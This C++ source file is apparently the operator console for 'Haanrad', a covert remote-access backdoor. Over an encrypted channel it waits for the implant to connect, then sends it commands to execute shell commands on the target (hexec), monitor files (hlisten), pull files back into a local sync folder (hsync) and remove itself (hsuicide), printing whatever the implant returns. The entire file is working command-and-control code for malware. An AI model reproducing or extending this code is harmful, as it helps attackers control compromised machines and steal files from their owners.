#include <iostream>
#include <cstring>
#include <csignal>
#include <stdlib.h>
#include "MessageQueue.h"
#include "CommHandler.h"
#include "../shared/utils/Logger.h"
#include "../shared/HCrypto.h"
#include "LocalFileManager.h"
#include "../shared/utils/argparcer.h"

CommHandler * globalCommHandler = nullptr;

pthread_t listenerThread;
pthread_t senderThread;

bool keepRunning = true;

void shutdownClient(int signo){

    cout << ":> ==== Shutting Down Client ====" << endl;

    if(globalCommHandler == nullptr){
        cout << ":> Unable To Shutdown Gracefuly. Forcing" << endl;
        exit(1);
    }else{
        keepRunning = false;
        globalCommHandler->killListening();
        globalCommHandler->killProcessing();
    }



}

void * listenBootstrapper(void * commHandlerListener){
    CommHandler * listener = (CommHandler *)commHandlerListener;
    listener->listenForMessages();
}

void * sendBootstrapper(void * commHandlerSender){
    CommHandler * sender = (CommHandler *)commHandlerSender;
    sender->processMessagesToSend();
}


Message generateHaanradPacket(string haanradCommand){

    Message message;
    message.interMessageCode = InterClientMessageType::NONE;

    string haanradPacket = "{HAAN";

    //generate the mode byte
    if(haanradCommand.find("hexec") ==0){
        //this is to execute
        unsigned char pktMode = (unsigned char)MessageType::CMD;
        message.messageType = MessageType::CMD;
        haanradPacket += pktMode;
    }else if(haanradCommand.find("hlisten") == 0){
        //this is to listen
        unsigned char pktMode = (unsigned char)MessageType::FILE;
        message.messageType = MessageType::FILE;
        haanradPacket += pktMode;
    }else if(haanradCommand.find("hsync") == 0){
        //this is to sync
        unsigned char pktMode = (unsigned char)MessageType::FILESYNC;
        message.messageType = MessageType::FILESYNC;
        haanradPacket += pktMode;
    }else if(haanradCommand.find("hsuicide") == 0){
        //this is to kill haanrad
        unsigned char pktMode = (unsigned char)MessageType::SPCCMD;
        message.messageType = MessageType::SPCCMD;
        haanradPacket += pktMode;
        haanradCommand += " hsuicide";
    }else{
        message.messageType = MessageType::INTERCLIENT;
        message.interMessageCode = InterClientMessageType::ERROR;
        return message;
    }

    //add the data
    int firstSpace = haanradCommand.find(" ");
    string parameters = haanradCommand.substr(firstSpace + 1);
    haanradPacket += parameters;
    haanradPacket += "HAAN}";

    message.data = parameters;
    message.rawCommandMessage = haanradPacket;

    return message;

}


int main(int argc, char * argv[]) {

    string syncDirectory = "./sync";

    cout << "==== Initializing Haanrad Console ====" << endl;
    ArgParcer parcer;
    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
    //Logger::setDebug(true);


    //register listening for kill commands.
    struct sigaction act;
    act.sa_handler = shutdownClient;
    act.sa_flags = 0;
    if(sigemptyset(&act.sa_mask) == -1 || sigaction(SIGINT, &act, NULL) == -1){
        Logger::debug("Main - Failed To Set Ctrl+C Interrupt Handler");
        return 1;
    }

    //Create MessageQueue
    MessageQueue * queue = new MessageQueue();
    HCrypto * crypto = new HCrypto();

    //Create CommHandler
    // - Pass MessageQueue
    CommHandler * commHandler = CommHandler::getInstance(queue, crypto);
    globalCommHandler = commHandler;

    pthread_create(&listenerThread, NULL, &listenBootstrapper, commHandler);
    pthread_create(&senderThread, NULL, &sendBootstrapper, commHandler);

    //Spawn CommHandler on new Thread

    //while

        //wait for message from MessageQueue

        //print out

        //wait for input from user if message requires it (Message Can Be An Object ?)


    cout << ":> Initialization Complete" << endl;
    cout << ":> Haanrad Must Connect Before Interactivity Will Enable" << endl;

    bool haanradConnected = false;
    bool promptedHelp = false;
    bool checkQueue = false;

    while(haanradConnected == false && keepRunning == true){
        Message message = queue->recvFromHaanrad();

        if(message.interMessageCode != InterClientMessageType::EMPTY){

            if(message.messageType == MessageType::INTERCLIENT){

                switch(message.interMessageCode){
                    case InterClientMessageType::CONNECTED:{
                        cout << ":> " << message.data << endl;
                        cout << ":> " << "Enabling Interactivity" << endl;
                        haanradConnected = true;
                        break;
                    }
                }
            }

        }
    }

    if(keepRunning == false){

        pthread_join(listenerThread, NULL);
        pthread_join(senderThread, NULL);

        cout << "==== Shutdown Successful. Cleaning up Resources ====" << endl;

        delete(queue);
        queue = nullptr;
        delete(crypto);
        crypto = nullptr;
        delete(commHandler);
        commHandler = nullptr;

        cout << "==== Cleanup Complete. Terminating ====" << endl;
        return 0;
    }

    LocalFileManager * lfm = new LocalFileManager(syncDirectory);
    string haanradPath = "";

    //at this point haanrad has connected and interactive mode is possible
    while(keepRunning){

        if(promptedHelp == false){
            cout << ":> Interactivity Has Been Enabled. The Following KeyWords Are Available:" << endl;
            cout << ":> \t send <command>\t\tSend A Command To Haanrad Using Valid Haanrad Commands" << endl;
            cout << ":> \t check \t\t\t\tCheck For New Messages Sent From Haanrad. This Includes Command Results Or File Events" << endl;
            promptedHelp = true;
        }

        Message message;
        message.messageType = MessageType::DUD;
        if(checkQueue == true){
            message = queue->recvFromHaanrad();
            checkQueue = false;

        }

        //if the InterClientCode is EMPTY then we know a check occurred (default value is NONE)
        if(message.interMessageCode == InterClientMessageType::EMPTY){
            cout << ":> Check Complete. There Are No Messages From Haanrad" << endl;
        }else{
            if(message.interMessageCode == InterClientMessageType::ERROR){
                cout << ":> An Error Message Was Found. Details: " << message.data << endl;
            }

            if(message.messageType == MessageType::CMDANSWER){
                cout << ":> An hexec command has returned. The Results Are:" << endl;
                cout << ":> ==== Start Of Transmission ====" << endl;
                cout << ":> " << message.data << endl;
                cout << ":> ====  End Of Transmission  ====" << endl;
            }

            if(message.messageType == MessageType::FILEANSWER){
                cout << ":> A hlisten or hsync notification has returned." << endl;
                if(message.data.at(0) == '1'){
                    //next packet will belong to a download
                    cout << ":> An hsync notification has been detected. The next check will write the contents to file" << endl;

                    unsigned long pathIndex = message.data.find('/');
                    haanradPath = message.data.substr(pathIndex + 1);
                    string fullPath = syncDirectory + "/" + haanradPath;
                    lfm->buildOutDirectory(haanradPath);
                    cout << ":> The hsync file will be downloaded to: " << fullPath << endl;

                    cout << ":> ==== Start Of Transmission ====" << endl;
                    cout << ":> " << message.data.substr(1) << endl;
                    cout << ":> ====  End Of Transmission  ====" << endl;

                }else{
                    cout << ":> ==== Start Of Transmission ====" << endl;
                    cout << ":> " << message.data.substr(1) << endl;
                    cout << ":> ====  End Of Transmission  ====" << endl;
                }
            }

            if(message.messageType == MessageType::FILEDWNLD){
                string fullPath = syncDirectory + "/" + haanradPath;
                cout << ":> A file Download Has Been Detected. Will Write To PreConfigured Location (" << fullPath
                     << ")" << endl;
                cout << ":> Writing Is Starting ..." << endl;
                lfm->syncFile(haanradPath, message.data);
                cout << ":> Writing Has Completed" << endl;
            }
        }
        //additional checks if something does arrive...



        //now can get user input again
        int BUFFERLEN = 1024;
        char BUFFER[BUFFERLEN];
        memset(BUFFER, '\0', BUFFERLEN);

        cout << ":> ";
        fgets(BUFFER, BUFFERLEN, stdin);
        string command(BUFFER);
        if(command.length() > 0){
            command.erase(command.length() - 1); //remove the \n character
        }

        if(keepRunning == false){
            break;
        }

        if(command.find("exit")==0){
            shutdownClient(0);
            break;
        }

        if(command.find("send") != 0 && command.find("check") != 0 && command.find("buf") != 0){
            cout << ":> Invalid Command Entered. Cannot Process" << endl;
            promptedHelp = false;
            continue;
        }

        //if send then send this command
        if(command.find("send") == 0){
            cout << ":> Queueing Message To Be Sent To Haanrad" << endl;
            string haanradCommand = command.substr(5);

            Message message = generateHaanradPacket(haanradCommand);
            if(message.interMessageCode == InterClientMessageType::ERROR){
                cout << ":> Command Format Invalid. Could Not Send Message to Haanrad" << endl;
                continue;
            }

            //add the message to the Queue
            queue->sendToHaanrad(message);
            cout << ":> Message Queued To Be Sent. Use the check command to check for responses" << endl;
            continue;

        }

        //if check command look for new data
        if(command.find("check") == 0){
            cout << ":> Checking For New Messages" << endl;
            checkQueue = true;
            continue;
        }

        //debug commands
        if(command.find("bufcheck") == 0){
            cout << ":> Dumping Out Current Recv Buffer From Haanrad" << endl;
            string * buffer = commHandler->getCommandBuffer();
            cout << ":>   >" << *buffer << "<" << endl;
        }

        if(command.find("bufclear") == 0){
            cout << ":> Clearing Comm Handler Buffer" << endl;
            commHandler->clearCommandBuffer();
            cout << ":> Clear Comm Handler Buffer Complete" << endl;
        }
    }

    //wait for the children!
    pthread_join(listenerThread, NULL);
    pthread_join(senderThread, NULL);

    cout << "==== Shutdown Successful. Cleaning up Resources ====" << endl;

    delete(queue);
    queue = nullptr;
    delete(crypto);
    crypto = nullptr;
    delete(commHandler);
    commHandler = nullptr;
    delete(lfm);
    lfm = nullptr;

    cout << "==== Cleanup Complete. Terminating ====" << endl;

    return 0;
}